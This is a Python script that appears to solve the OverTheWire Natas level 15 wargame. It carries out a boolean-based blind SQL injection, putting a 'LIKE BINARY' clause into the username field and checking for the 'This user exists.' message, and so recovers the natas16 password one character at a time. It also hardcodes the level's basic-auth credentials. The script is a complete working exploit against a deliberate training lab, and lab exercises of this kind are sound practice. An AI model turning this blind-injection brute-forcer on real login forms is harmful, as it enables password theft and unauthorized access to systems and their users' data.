import requests
import string

BASIC_AUTH_USER = 'natas15'
BASIC_AUTH_PASSWORD = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

def generate_characters_dictionary():
    alpha_numeric_string = string.ascii_letters + string.digits
    dictionary = []
    for single_character in alpha_numeric_string:
        username_like = 'natas16" and password LIKE BINARY \'%' + single_character + '%\'"'
        payload = {'username': username_like}
        response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), data=payload)
        response_text = response.text
        if "This user exists." in response_text:
            dictionary.append(single_character)
    return dictionary


def find_password():
    dictionary = generate_characters_dictionary()
    print(dictionary)
    password_found = False
    password = ''
    while password_found is False:
        for single_character in dictionary:
            new_password = password + single_character
            username_like = 'natas16" and password LIKE BINARY \'' + new_password + '%\'"'
            payload = {'username': username_like}
            response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), data=payload)
            response_text = response.text
            if "This user exists." in response_text:
                password = new_password
                print('Password so far: ', password)
                # all previous password were 32 in length
                if len(password) == 32:
                    password_found = True
                break
    print('Password: ', password)

find_password()